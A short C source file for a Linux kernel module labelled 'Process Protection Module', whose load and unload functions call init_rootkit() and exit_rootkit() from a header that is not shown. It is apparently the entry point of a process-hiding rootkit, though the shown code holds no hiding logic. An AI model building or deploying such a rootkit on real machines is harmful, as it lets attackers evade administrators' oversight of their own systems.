#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>

#include "process_protection.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("B3ale");
MODULE_DESCRIPTION("Process Protection Module");

static int __init hello_init(void) {
    printk("init module\n");

    init_rootkit();

    return 0;
}

static void __exit hello_exit(void) {
    exit_rootkit();

    printk("exit module\n");
}

module_init(hello_init);
module_exit(hello_exit);

